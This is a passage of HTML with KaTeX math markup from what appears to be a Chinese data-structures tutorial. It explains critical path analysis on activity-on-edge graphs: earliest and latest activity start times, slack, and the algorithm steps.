style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span>，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mi>v</mi><mi>l</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>−</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl[k] = vl[j] - Weight(v_{k}, v_{j})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。以此类推，直至输出全部栈中顶点</li>
</ul>
</li>
<li>
<p><strong>活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最早开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></strong></p>
<p>它是指该活动弧的起点所表示的事件的最早发生时间。若边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v_{k}, v_{j}&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8252em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 表示活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e(i) = ve(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最迟开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></strong></p>
<p>它是指该活动弧的终点所表示事件的最迟发生时间与该活动所需时间之差。若边 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">&lt;v_{k}, v_{j}&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8252em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span></span></span></span> 表示活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mi>j</mi><mo stretchy="false">)</mo><mo>−</mo><mi>W</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><msub><mi>v</mi><mi>j</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(i) = vl(j) - Weight(v_{k}, v_{j})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>一个活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的最迟开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span> 和其最早开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span> 的差额 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d(i) = l(i)  e(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></strong></p>
<p>它是指该活动完成的时间余量，即在不增加完成整个工程所需总时间的情况下，活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 可以拖延的时间。若一个活动的时间余量为零，则说明该活动必须要如期完成，否则就会拖延整个工程的进度，所以称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>−</mo><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">l(i) - e(i) = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(i) = e(i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span> 的活动 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是关键活动。</p>
<p>求关键路径的算法步骤如下：</p>
<ol>
<li>从源点出发，令 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mtext>源点</mtext><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">ve(\text{源点}) = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">源点</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，按拓扑有序求其余顶点的最早发生时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></li>
<li>从汇点出发，令 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mtext>汇点</mtext><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mtext>汇点</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl(\text{汇点}) = ve(\text{汇点})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">汇点</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord text"><span class="mord cjk_fallback">汇点</span></span><span class="mclose">)</span></span></span></span>，按逆拓扑有序求其余顶点的最迟发生时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></li>
<li>根据各顶点的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ve()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span> 值求所有弧的最早开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></li>
<li>根据各顶点的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>l</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">vl()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span> 值求所有弧的最迟开始时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l()</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mclose">)</span></span></span></span></li>
